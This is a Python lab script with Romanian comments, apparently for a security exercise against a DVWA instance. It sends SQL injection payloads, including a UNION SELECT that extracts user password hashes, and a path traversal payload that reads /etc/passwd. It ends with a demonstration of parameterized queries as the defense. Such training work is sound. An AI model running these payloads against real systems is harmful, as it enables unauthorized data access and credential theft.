import sys
import re
import sqlite3
from arsenal.web.client import cere


def testeaza_sqli(tinta_lab: str):
    print("=" * 60)
    print("TESTARE SQL INJECTION (B1 - B3)")
    print("=" * 60)

    # In DVWA, URL-ul pentru SQLi este la /vulnerabilities/sqli/
    url_sqli = tinta_lab.rstrip("/") + "/vulnerabilities/sqli/"

    # B1. Cererea normala ca reper
    print("[B1] Trimitere cerere normala (id=1)...")
    try:
        r_normal = cere(url_sqli, params={"id": "1", "Submit": "Submit"})
        len_normal = len(r_normal.text)
        print(f"     Lungime raspuns normal: {len_normal} octeti (status {r_normal.status_code})")
    except Exception as e:
        print(f"[-] Nu s-a putut conecta la {url_sqli}: {e}")
        len_normal = 0

    # B2. Payload care sparge interogarea
    payload_simplu = "1' OR '1'='1"
    print(f"\n[B2] Trimitere payload injectie: {payload_simplu}")
    try:
        r_atac = cere(url_sqli, params={"id": payload_simplu, "Submit": "Submit"})
        len_atac = len(r_atac.text)
        print(f"     Lungime raspuns atac: {len_atac} octeti")
        if len_atac > len_normal:
            print("     [+] POSIBIL SQLi CONFIRMAT: Raspunsul contine date suplimentare!")
    except Exception as e:
        print(f"[-] Eroare cerere atac: {e}")

    # B3. Automatizare lista payload-uri
    payloads = [
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "1' AND '1'='2"
    ]
    print("\n[B3] Automatizare testare lista payload-uri:")
    for pl in payloads:
        try:
            r = cere(url_sqli, params={"id": pl, "Submit": "Submit"})
            l = len(r.text)
            flag_vulnerabil = " [VULNERABIL / MAI LUNG]" if l > len_normal else ""
            print(f"     Payload: {pl:<20} -> {l} octeti{flag_vulnerabil}")
        except Exception:
            pass


def testeaza_lfi(tinta_lab: str):
    print("\n" + "=" * 60)
    print("TESTARE LOCAL FILE INCLUSION / PATH TRAVERSAL (B4)")
    print("=" * 60)
    url_lfi = tinta_lab.rstrip("/") + "/vulnerabilities/fi/"
    payload_cale = "../../../../etc/passwd"
    print(f"[*] Cerere pagina cu parametru traversare: {payload_cale}")

    try:
        r = cere(url_lfi, params={"page": payload_cale})
        if "root:" in r.text:
            print("[+] LFI CONFIRMAT! S-au citit fisiere de sistem (/etc/passwd):")
            linii_root = [l for l in r.text.splitlines() if "root:" in l or "daemon:" in l or "bin:" in l]
            for l in linii_root[:5]:
                print(f"     {l}")
        else:
            print("[-] Semnatura 'root:' nu a fost gasita in raspuns.")
    except Exception as e:
        print(f"[-] Eroare la testare LFI: {e}")


def extragere_union(tinta_lab: str):
    print("\n" + "=" * 60)
    print("EXTRAGERE DATE CU UNION SELECT (B5)")
    print("=" * 60)
    url_sqli = tinta_lab.rstrip("/") + "/vulnerabilities/sqli/"
    payload_union = "1' UNION SELECT user, password FROM users-- -"
    print(f"[*] Trimitere payload UNION: {payload_union}")

    try:
        r = cere(url_sqli, params={"id": payload_union, "Submit": "Submit"})
        hashuri = re.findall(r"([a-f0-9]{32})", r.text)
        if hashuri:
            print(f"[+] S-au extras {len(hashuri)} hash-uri MD5 din tabela users:")
            for h in set(hashuri):
                print(f"     Hash parola: {h}")
        else:
            print("[*] Cererea s-a executat (verificati drepturile si sesiunea).")
    except Exception as e:
        print(f"[-] Eroare la UNION: {e}")


def demonstratie_aparare():
    print("\n" + "=" * 60)
    print("APARARE: INTEROGARE PARAMETRIZATA (B6)")
    print("=" * 60)

    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE u(nume TEXT, parola TEXT)")
    db.execute("INSERT INTO u VALUES ('ana', 'secret123')")
    db.execute("INSERT INTO u VALUES ('admin', 'adminpass')")

    payload_rau = "' OR '1'='1"
    print(f"[*] Input introdus de atacator: {payload_rau}")

    # Varianta gresita (concatenare vulnerabila)
    interogare_vulnerabila = f"SELECT * FROM u WHERE nume='{payload_rau}'"
    print(f"[!] Interogare VULNERABILA generata:\n     {interogare_vulnerabila}")
    rezultat_vulnerabil = db.execute(interogare_vulnerabila).fetchall()
    print(f"     Rezultat obtinut prin injectie: {rezultat_vulnerabil} -> TOATE CONTURILE EXPUSE!")

    # Varianta securizata (parametrizata)
    interogare_sigura = "SELECT * FROM u WHERE nume = ?"
    print(f"\n[+] Interogare SIGURA (parametrizata):\n     {interogare_sigura}")
    rezultat_sigur = db.execute(interogare_sigura, (payload_rau,)).fetchall()
    print(f"     Rezultat obtinut cu parametri: {rezultat_sigur} -> NICIUN CONT EXPUS (Corect!)")


def main():
    tinta = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.56.101"
    testeaza_sqli(tinta)
    testeaza_lfi(tinta)
    extragere_union(tinta)
    demonstratie_aparare()


if __name__ == "__main__":
    main()
